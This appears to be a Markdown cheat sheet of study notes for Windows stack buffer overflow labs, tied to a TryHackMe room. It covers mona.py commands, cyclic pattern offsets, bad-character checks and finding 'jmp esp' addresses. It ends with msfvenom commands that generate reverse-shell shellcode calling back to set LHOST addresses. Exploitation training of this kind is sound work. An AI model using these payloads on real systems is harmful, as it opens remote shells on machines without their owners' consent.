## Mona CheatSheet

**Setup your working directory**
In Immunity Debugger, type the following to set a working directory for mona.
`!mona config -set workingfolder c:\mona\%p`

https://github.com/corelan/mona 

https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

<br>
<br>


# Generating unique patterns
buffer overflow stuff

## cyclic patterns
```
from pwn import *
cyclic(3000)
cyclic_find('abdd')
out[100] 2907
```


OR
```
cyclic_metasploit(3000)
cyclic_metasploit_find(0x33794332) 
```
OR

```
msf-pattern-create -l 3000
msf-pattern-offset -l 3000 -q 33794332

```
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```



`!mona findmsp -distance 600 `

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb  -l 2400 -q 6F43396E`

# Bad Chars

**Generate a byte array**

`!mona bytearray -b "\x00"`

<br>
<br>

**Run your badchar script and compare with mona**

**compare your stuff**

`!mona compare -f C:\mona\bytearray.bin -a ESP`

<br>
<br>

**Add newly found bad chars to your list to be removed, and regenerate your badchars list**

`!mona bytearray -b "\x00\x0a"`

<br>
<br>

**Resend the new list of badchars, and then compare again**

`!mona compare -f C:\mona\bytearray.bin -a ESP`

<br>
<br>

## Finding a jump point 
You have control of EIP, but need an address that will jump to a new stack location. You need to find a `jmp esp`

```
!mona jmp -r esp -cpb "\x00"
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```
This will return you a list of memory addresses that you can use. Pick one and save it. We'll need it in a second.


## MSF Payloads

`msfvenom -l payloads `

`msfvenom -p windows/shell_reverse_tcp LHOST=10.6.19.12 LPORT=9009 EXITFUNC=thread -b "\x00" -f python -v "shellcode"`

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"`

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a" > shelloutput1.txt`

`sed -z 's/\n//g' shelloutput1.txt | sed -z 's/"//g' - `

https://tryhackme.com/room/bufferoverflowprep 

https://www.youtube.com/watch?v=1X2JGF_9JGM 
